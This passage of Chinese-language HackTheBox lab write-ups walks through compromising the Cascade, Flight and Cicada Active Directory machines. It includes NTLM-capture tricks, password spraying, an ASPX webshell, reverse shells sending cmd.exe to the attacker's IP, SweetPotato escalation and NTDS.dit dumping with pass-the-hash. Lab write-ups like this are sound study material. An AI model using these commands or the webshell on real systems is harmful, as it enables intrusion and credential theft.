53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 06:10:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-11T06:11:17
|_  start_date: 2025-02-11T05:53:28
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -16m50s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   277.14 ms 10.10.16.1
2   277.34 ms 10.10.10.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1031.72 seconds
```

尝试smb匿名登录

```
smbclient -L //10.10.10.182 -N
```

![image-20250211161905972](./HTB_Active_Directory.assets/image-20250211161905972.png)

没找到有用信息，使用ldapsearch试试（之前通过nmap拿到了域名：cascade.local

```
ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182
```

![image-20250211162100539](./HTB_Active_Directory.assets/image-20250211162100539.png)

ldap可以匿名访问，通过ldapsearch进一步信息收集

> 通过ldapsearch只输出用户名

```
ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | awk '{print $2}'
```

![image-20250211162812529](./HTB_Active_Directory.assets/image-20250211162812529.png)

把拿到的用户名都做成字典跑一个GetNPUsers

```
impacket-GetNPUsers cascade.local/ -dc-ip 10.10.10.182 -no-pass -usersfile 'users.txt'
```

![image-20250211162947570](./HTB_Active_Directory.assets/image-20250211162947570.png)

无收获，看了眼hints，提示查看cascadeLegacyPwd字段

```
ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 "(cascadeLegacyPwd=*)" cascadeLegacyPwd
```

![image-20250211163227466](./HTB_Active_Directory.assets/image-20250211163227466.png)

找到了一个密码clk0bjVldmE=，等于号结尾，使用cyberchef解密

![image-20250211163324971](./HTB_Active_Directory.assets/image-20250211163324971.png)

拿到真正的密码：rY4n5eva

用户名是r.thompson

这次换了一个效率高的工具：netexec/nxc

> 支持的协议：
>
> 1、SMB协议
>
> 2、LDAP协议
>
> 3、WinRM协议
>
> 4、MSSQL协议
>
> 5、SSH协议
>
> 6、FTP协议
>
> 7、RDP协议
>
> 8、WMI协议

netexec测试smb匿名登录

```
netexec smb 10.10.10.182 --shares -u '' -p ''
或
netexec smb 10.10.10.182 --shares -u 'guest' -p ''
```

尝试认证登录

```
netexec smb 10.10.10.182 --shares -u 'r.thompson' -p 'rY4n5eva'
```

![image-20250211164926655](./HTB_Active_Directory.assets/image-20250211164926655.png)

使用smbclient登录查看Date目录，树状展开：

```
recurse ON
ls
```

找到了一个email，提到了一个用户名

![image-20250211165548025](./HTB_Active_Directory.assets/image-20250211165548025.png)

还有一个reg注册表文件

![image-20250211165849900](./HTB_Active_Directory.assets/image-20250211165849900.png)

下载下来，为了后续操作方便，把文件名的空格换了

![image-20250211170130749](./HTB_Active_Directory.assets/image-20250211170130749.png)

同时该文件位于s.smith目录下，

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

可以在网上找一些exe来DES-ECB解密该密文，但是我试了几个都不行，cyberchef手撸也没撸出来，找到一个很牛逼的命令

> VNC reg文件解密
>
> ```
> echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
> ```

![image-20250211173043361](./HTB_Active_Directory.assets/image-20250211173043361.png)

拿到s.smith的密码sT333ve2

```
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT333ve2'
```

![image-20250211173231455](./HTB_Active_Directory.assets/image-20250211173231455.png)

拿到flag1，查看用户权限的时候发现一个脚本：MapAuditDrive.vbs，登录就会运行

![image-20250211173402718](./HTB_Active_Directory.assets/image-20250211173402718.png)

全盘查找这个文件并打开看看

![image-20250211173539157](./HTB_Active_Directory.assets/image-20250211173539157.png)

这里跟共享目录有沾边了，使用该账号登录smb看看

```
netexec smb 10.10.10.182 --shares -u 's.smith' -p 'sT333ve2'
```

![image-20250211173829086](./HTB_Active_Directory.assets/image-20250211173829086.png)

联想到刚刚的VBS脚本吗，首选需注意Audit$文件夹

```
smbclient //10.10.10.182/Audit$ -U 's.smith'%'sT333ve2'
```

![image-20250211174013527](./HTB_Active_Directory.assets/image-20250211174013527.png)

里面有一个sqlite的数据库db文件，先下载下来，Audit这个词出现频率很高，搜索得知是一个`活动目录审计工具`，还有个bat文件也下载下来

在下载下来的db文件中发现ArkSvc用户及密码(密码貌似经过base64加密)

```
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```



![image-20250211174706080](./HTB_Active_Directory.assets/image-20250211174706080.png)

但是直接base64解不出来，查看vbs发现加解密逻辑跟`CascAudit.exe`有关，拿出来反编译......

PS：这里不会，抄袭下一步！

经过借鉴得知密码被base64+AES加密了，key为c4scadek3y654321，IV为1tdyjCbY1Ix49842，CBC模式即可解密

![image-20250211180008005](./HTB_Active_Directory.assets/image-20250211180008005.png)

得到密码w3lc0meFr31nd，账号为ArkSvc

```
evil-winrm -i 10.10.10.182 -u 'ArkSvc' -p 'w3lc0meFr31nd'
```

使用bloodhound对域做信息收集

```
bloodhound-python -u ArkSvc -p 'w3lc0meFr31nd' -d cascade.local -ns 10.10.10.182 -c DcOnly
```

这时候突然想起来之前的邮件内容，有一个被删除的用户`TempAdmin`，密码和管理员一样，查看用户组

![image-20250211213602760](./HTB_Active_Directory.assets/image-20250211213602760.png)

顺上了，之前翻sqlite数据库的时候再被删除的用户这里也看到了`TempAdmin`用户

![image-20250211213734218](./HTB_Active_Directory.assets/image-20250211213734218.png)

百度一下，使用下面命令查看被删除的对象

```
Get-ADObject -IncludeDeletedObjects -Filter {isDeleted -eq $true} -Property *
```

![image-20250211214401125](./HTB_Active_Directory.assets/image-20250211214401125.png)

找到一个类似密码的，看着有加密，使用cyberchef base64解密得到密码：baCT3r1aN00dles

也可以使用命令(只显示TempAdmin的信息)：

```
Get-ADObject -IncludeDeletedObjects -Filter {sAMAccountName -eq "TempAdmin"} -Property *
```

之前邮件说了，administrator密码和TempAdmin一样

```
evil-winrm -i 10.10.10.182 -u 'administrator' -p 'baCT3r1aN00dles'
```

拿到flag2

![image-20250211214715706](./HTB_Active_Directory.assets/image-20250211214715706.png)



## Flight

信息收集：

```
┌──(root㉿cyborg)-[~/swap/htb_swap/ad_Flight]
└─# nmap -sS -A 10.10.11.187 -p- -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 19:00 CST
Nmap scan report for 10.10.11.187
Host is up (0.20s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-12 17:48:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h43m04s
| smb2-time: 
|   date: 2025-02-12T17:49:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   212.53 ms 10.10.16.1
2   212.58 ms 10.10.11.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 359.47 seconds
```

80端口有服务，扫一下目录

![image-20250212191537939](./HTB_Active_Directory.assets/image-20250212191537939.png)

找到cgi-bin/printenv.pl，网上搜一下(也试了smbmap和ldapsearch，均为找到入口，只有这个站了)，试了一下CGI方面的漏洞，均为成功，去看WP了...

> tips：
>
> 经过查看资料，忘了之前打htb习惯了，就是把收集到的域名放到hosts文件中，这个题需要把flight.htb和ip对应上，才能使用ldapsearch查东西(貌似

```
ldapsearch -H ldap://flight.htb  -x -s base -b '' "(objectClass=*)" "*" +
```

![image-20250212192854510](./HTB_Active_Directory.assets/image-20250212192854510.png)

又找到一个域名，放到hosts文件，然后子域名爆破（一开始用的dnsenum，莫名不行，还是用wfuzz

```
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb"  --hh 7069
```

![image-20250212193727731](./HTB_Active_Directory.assets/image-20250212193727731.png)

找到一个子域`school`，加入hosts

![image-20250212193832812](./HTB_Active_Directory.assets/image-20250212193832812.png)

找到一个新页面，在这个页面点了点，发现可能存在LFI的点，试了下远程文件包含getshell未果

![image-20250212194301355](./HTB_Active_Directory.assets/image-20250212194301355.png)

本地文件包含成功读取win.ini

![image-20250212194532262](./HTB_Active_Directory.assets/image-20250212194532262.png)

> 由于这是一台 Windows 机器，我们也可以尝试加载一个文件从 UNC 路径。
>
> 如果这有效，则计算机必须进行**身份验证**才能访问我们指定的共享。
>
> 此外，它将以运行 Apache 服务的用户身份进行身份验证。让我们使用一个名为Responder拦截可能发生的任何身份验证。
>
> > 通过该方法，我们可以通过nc获取到认证信息

本机执行

```
responder -I tun0 -v
```

浏览器访问

```
http://school.flight.htb/index.php?view=//10.10.16.15/1111
```

![image-20250212195011115](./HTB_Active_Directory.assets/image-20250212195011115.png)

成功获取到域用户flight\svc_apache的hash，使用john破解获得明文密码：S@Ss!K@*t13 

![image-20250212195111919](./HTB_Active_Directory.assets/image-20250212195111919.png)

尝试evil-winrm登录未果，登录smb看看

```
netexec smb 10.10.11.187 --shares -u 'svc_apache' -p 'S@Ss!K@*t13'
```

![image-20250212195321567](./HTB_Active_Directory.assets/image-20250212195321567.png)

登陆成功，看到了共享文件，Web比较吸引目光，进去看看

```
smbclient //10.10.11.187/Web -U 'svc_apache'%'S@Ss!K@*t13'
```

![image-20250212195438080](./HTB_Active_Directory.assets/image-20250212195438080.png)

看到了刚刚的两个网站目录，只有只读权限，无法写入webshell。

看了下hints，可以利用下面命令获取域内用户名，进行密码喷洒

```
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
```

![image-20250212195703199](./HTB_Active_Directory.assets/image-20250212195703199.png)

将用户做成字典，使用crackmapexec进行密码喷洒

```
crackmapexec smb flight.htb -u ./users.txt -p 'S@Ss!K@*t13'
```

又找到了一个用户S.Moon，密码：S@Ss!K@*t13

![image-20250212200155709](./HTB_Active_Directory.assets/image-20250212200155709.png)

evil-winrm登录失败

```
evil-winrm -i 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
```

![image-20250212200617355](./HTB_Active_Directory.assets/image-20250212200617355.png)

返回去看smb

```
netexec smb 10.10.11.187 --shares -u 'S.Moon' -p 'S@Ss!K@*t13'
```

![image-20250212200701726](./HTB_Active_Directory.assets/image-20250212200701726.png)

Shared目录有写入权限了

```
smbclient //10.10.11.187/Shared -U 'S.Moon'%'S@Ss!K@*t13'
```

![image-20250212201109569](./HTB_Active_Directory.assets/image-20250212201109569.png)

什么东西都没有，但是目录有写入权限，肯定有说法！

看了hints

> 在 Windows 中，许多文件在放置在目录中并被访问时会自动“执行”。
>
> 这些文件可能指向资源的网络共享，从而强制计算机进行身份验证以访问资源。事实上，有一个名为 ntl_theft 的工具可以创建多个文件。
>
> 可能仅通过访问文件夹就可能用于窃取用户的 NTLMv2 哈希。

同样本机执行

```
responder -I tun0 -v
```

使用工具ntl_theft（10.10.16.15是我的IP

```
git clone https://github.com/Greenwolf/ntlm_theft
cd ./ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.16.15 --filename cyborg
```

![image-20250212202400263](./HTB_Active_Directory.assets/image-20250212202400263.png)

然后就是在smb的write目录下执行这些，这里必须得用smbclient

```
impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
use Shared
put文件一个一个尝试上传
```

![image-20250212202346317](./HTB_Active_Directory.assets/image-20250212202346317.png)

粗略试了几个，只有ini文件可以传（看着答案说答案了属于是......

然后再本机的responder命令框那里就会收到回显，工具确实好用(:

![image-20250212202438491](./HTB_Active_Directory.assets/image-20250212202438491.png)

再常规使用john破解即可

![image-20250212202609116](./HTB_Active_Directory.assets/image-20250212202609116.png)

拿到c.bum的密码Tikkycoll_431012284，尝试evil-winrm登录还是不行

```
evil-winrm -i 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
```

![image-20250212202841255](./HTB_Active_Directory.assets/image-20250212202841255.png)

继续回到smb看

```
smbmap -u 'c.bum' -p 'Tikkycoll_431012284' -H 10.10.11.187
```

![image-20250212202855344](./HTB_Active_Directory.assets/image-20250212202855344.png)

可以读取Users目录，并且可以写入Web目录，根据网站提示，先去User把flag1拿了

```
impacket-smbclient c.bum:'Tikkycoll_431012284'@flight.htb
```

![image-20250212203112641](./HTB_Active_Directory.assets/image-20250212203112641.png)

然后本地查看就行

接下来smb连接web目录，上传一句话木马

![image-20250212203500683](./HTB_Active_Directory.assets/image-20250212203500683.png)

目录好像有定时删除，先反弹一个shell

![image-20250212204617827](./HTB_Active_Directory.assets/image-20250212204617827.png)

shell权限为svc_apache，用户组也都是正常的（想想也是，排除掉两个密码一样的，只剩下c.bum用户，首先要想办法切换用户

这里试了很多很多办法都不行....

查了资料，使用RunasCs.exe   https://github.com/antonioCoco/RunasCs/releases/tag/v1.5

上传上去，执行：

```
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.16.15:9002
```

![image-20250212211701044](./HTB_Active_Directory.assets/image-20250212211701044.png)

成功反弹c.bum用户shell

![image-20250212211717981](./HTB_Active_Directory.assets/image-20250212211717981.png)

看下用户组，发现一个不一样的：WebDevs

![image-20250212211751976](./HTB_Active_Directory.assets/image-20250212211751976.png)

妈的跟偏了，其实重点在端口，包括WebDevs用户组也是提醒有个IIS的站

```
netstat -ano
Get-NetTCPConnection -State Listen 
```

![image-20250212212246571](./HTB_Active_Directory.assets/image-20250212212246571.png)

有一个8000端口，被防火墙拦了，需要代理出来

```
这个不行，但是命令很有用，记录一下，不行是因为7000也没开放
.\iox fwd -l 0.0.0.0:7000 -r 127.0.0.1:8000

kali运行(配置socks5代理，127.0.0.1:1080)
./iox proxy -l 2222 -l 1080
靶机运行(10.10.16.15是攻击机IP)
./iox proxy -r 10.10.16.15:2222
```

![image-20250212214934187](./HTB_Active_Directory.assets/image-20250212214934187.png)

![image-20250212214952999](./HTB_Active_Directory.assets/image-20250212214952999.png)

成功访问，c.bum既然是IIS网站用户组的，应该有权限写入文件，写一个aspx的与句话木马进去

```
Invoke-WebRequest -Uri http://10.10.16.15:90/shell.aspx -OutFile "C:\inetpub\development\shell.aspx"
```

aspx的一句话木马这里卡太久了，一直没找到能用的，下面这个是调教了很久GPT写出来的

```
//?pass=whoami
<%@ Page Language="Jscript" %>
<%
var command = Request.QueryString["pass"];
if (command) {
    var shell = new ActiveXObject("WScript.Shell");
    var exec = shell.Exec(command);  // 使用 Exec() 获取输出
    var output = exec.StdOut.ReadAll();  // 读取命令输出
    Response.Write(output);  // 显示输出
}
%>
```

![image-20250212221706464](./HTB_Active_Directory.assets/image-20250212221706464.png)

再次反弹shell

![image-20250212221859365](./HTB_Active_Directory.assets/image-20250212221859365.png)

官方WP后面使用的是DCSync，挺麻烦的，我这里使用SweetPotato

向其添加特权组 SID，可以利用土豆提权获取system权限

![image-20250212222236203](./HTB_Active_Directory.assets/image-20250212222236203.png)

上传SweetPotato和nc

```
Invoke-WebRequest -Uri http://10.10.16.15:90/nc.exe -OutFile "C:\xampp\htdocs\school.flight.htb\nc.exe"
Invoke-WebRequest -Uri http://10.10.16.15:90/SweetPotato.exe -OutFile "C:\xampp\htdocs\school.flight.htb\SweetPotato.exe"
```

土豆(SweetPotato)提权(这里反弹shell卡了一晚上......

ps:必须用`defaultapppool`用户身份提权

```
.\SweetPotato.exe -e EfsRpc -p "nc.exe" -a "10.10.16.15 9009 -e cmd.exe"

.\SweetPotato.exe -t * -p "nc.exe" -a "10.10.16.15 9009 -e cmd.exe"
```

![image-20250213093518807](./HTB_Active_Directory.assets/image-20250213093518807.png)

拿到system权限，拿到flag2

![image-20250213093629037](./HTB_Active_Directory.assets/image-20250213093629037.png)



## Cicada

信息收集：

```
┌──(root㉿cyborg)-[~/swap/htb_swap/ad_Cicada]
└─# nmap -sS -A 10.10.11.35 -p- -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 09:56 CST
Nmap scan report for 10.10.11.35
Host is up (0.17s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 08:43:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
64891/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-13T08:44:05
|_  start_date: N/A
|_clock-skew: 6h43m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   187.33 ms 10.10.16.1
2   187.43 ms 10.10.11.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.62 seconds
```

smb匿名访问

```
smbmap -u guest -H 10.10.11.35
```

![image-20250213101455179](./HTB_Active_Directory.assets/image-20250213101455179.png)

看下HR目录

```
smbclient //10.10.11.35/HR -N
```

![image-20250213101756223](./HTB_Active_Directory.assets/image-20250213101756223.png)

发现文件Notice from HR.txt，下载下来并将空格换为_

![image-20250213101839095](./HTB_Active_Directory.assets/image-20250213101839095.png)

拿到了一个密码：

```
Cicada$M6Corpb*@Lp#nZp!8
```

收集域内用户名进行密码喷洒，rpc登录失败

```
rpcclient -U "" -N 10.10.11.35
rpcclient $> enumdomusers
```

nxc爆破用户名，做成字典users.txt

```
nxc smb 10.10.11.35 -u guest -p '' --rid-brute --users
```

![image-20250213104354355](./HTB_Active_Directory.assets/image-20250213104354355.png)

进行密码喷洒

```
crackmapexec smb cicada.htb -u ./users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![image-20250213104402860](./HTB_Active_Directory.assets/image-20250213104402860.png)

找到正版用户名密码：

```
cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

evil-winrm登录失败

```
evil-winrm -i 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![image-20250213104531036](./HTB_Active_Directory.assets/image-20250213104531036.png)

老套路，尝试smb

```
smbmap -H 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![image-20250213104653950](./HTB_Active_Directory.assets/image-20250213104653950.png)

多了两个能访问的目录，进去看看

> 一般只有HR和DEV这种有用，SYSVOL就是屎！

```
impacket-smbclient 'michael.wrightson':'Cicada$M6Corpb*@Lp#nZp!8'@10.10.11.35
```

![image-20250213105014579](./HTB_Active_Directory.assets/image-20250213105014579.png)

在SYSVOL目录下发现东西，树桩展开

```
smbclient //10.10.11.35/SYSVOL -U 'michael.wrightson'%'Cicada$M6Corpb*@Lp#nZp!8'
recurse ON
ls
```

![image-20250213105206416](./HTB_Active_Directory.assets/image-20250213105206416.png)

有很多文件，下载下来

```
recurse ON
prompt OFF
mget *
```

直接将所有文件输出到屏幕

```
find . -type f -exec cat {} \;
```

没一个有用的.....，继续收集smb

> `enum4linux-ng` 是一个用于枚举 Windows 系统（特别是通过 SMB 和 NetAPI）的工具。它可以帮助你收集各种与 Windows 机器有关的信息，类似于 `enum4linux`，但是功能增强了，提供了更多的输出和选项。

```
enum4linux-ng -A -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -t 10
```

![image-20250213111505668](./HTB_Active_Directory.assets/image-20250213111505668.png)

又找到一个用户和密码

```
david.orelious/aRt$Lp#7t*VQ!3
```

用这个登录smb看看

```
smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

![image-20250213111715351](./HTB_Active_Directory.assets/image-20250213111715351.png)

多了一个DEV目录

```
smbclient //10.10.11.35/DEV -U 'david.orelious'%'aRt$Lp#7t*VQ!3'
```

![image-20250213111915364](./HTB_Active_Directory.assets/image-20250213111915364.png)

找到一个疑似powershell脚本备份文件，下载下来

![image-20250213111946081](./HTB_Active_Directory.assets/image-20250213111946081.png)

又拿到了一个用户凭证

```
emily.oscars/Q!3@Lp#M6b*7t*Vt
```

尝试evil-winrm登录成功

```
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![image-20250213112134231](./HTB_Active_Directory.assets/image-20250213112134231.png)

拿到flag1，查看用户权限

回忆BLACKFIELD的提权也跟这个一样

> `whoami /priv` 结果显示你拥有 `SeBackupPrivilege` 和 `SeRestorePrivilege`，这意味着你可以利用 **备份和恢复** 权限读取**敏感文件**，例如 `NTDS.dit`，然后提取域控的哈希，甚至尝试本地提权。
>
> 其中有一个方案是：
>
> > ***利用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升***
>
> 攻击的步骤大概分三步 
>
> - 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。 
> - 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥 
> - 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希

首先本次使用的test.dsh文件如下（需要考虑到目录的写入权限，我直接在Temp下面进行后面提权步骤

```
set context persistent nowriters
set metadata C:\Windows\Temp\\test.cab
set verbose on
add volume c: alias test
create
expose %test% z:
```

首先上传dll并加载

```
上传dll
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
上传test.dsh
diskshadow /s C:\Windows\Temp\test.dsh
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit C:\Windows\Temp\ntds.dit
reg save hklm\system C:\Windows\Temp\SYSTEM.hiv
然后把ntds.dit和SYSTEM.hiv下载下来
impacket-secretsdump -system SYSTEM.hiv -ntds ntds.dit LOCAL
```

![image-20250213130244478](./HTB_Active_Directory.assets/image-20250213130244478.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

PTH进去拿到flag2

```
evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

**还有一个提权方法，利用mimikatz**（费交互式shell，一定要加exit，不然会一直刷屏无法退出

```
reg save hklm\sam sam
reg save hklm\system system
upload mimikatz.exe
.\mimikatz.exe 'lsadump::sam /sam:sam /system:system' 'exit'> password.txt
```

![image-20250213132456737](./HTB_Active_Directory.assets/image-20250213132456737.png)



## Escape

信息收集：

```
┌──(root㉿cyborg)-[~/swap/htb_swap/ad_Escape]
└─# nmap -sS -A 10.10.11.202 -p- -T4                               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 16:14 CST
Nmap scan report for 10.10.11.202
Host is up (0.49s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-02-13 16:07:19Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
